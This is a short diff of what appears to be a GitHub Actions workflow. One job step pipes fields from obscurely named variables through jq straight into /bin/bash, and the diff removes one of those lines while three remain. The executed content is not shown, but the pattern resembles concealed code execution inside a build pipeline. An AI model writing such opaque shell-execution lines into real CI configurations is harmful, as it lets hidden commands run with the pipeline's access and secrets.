@@ -24,7 +24,6 @@ jobs:
           echo $f88744 | jq -r .i992 | /bin/bash
           echo $hep509 | jq -r .t5 | /bin/bash
           echo $gkwzv80 | jq -r .sq18 | /bin/bash
-          printf '%s' "$o97021" | jq -r .zw82 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
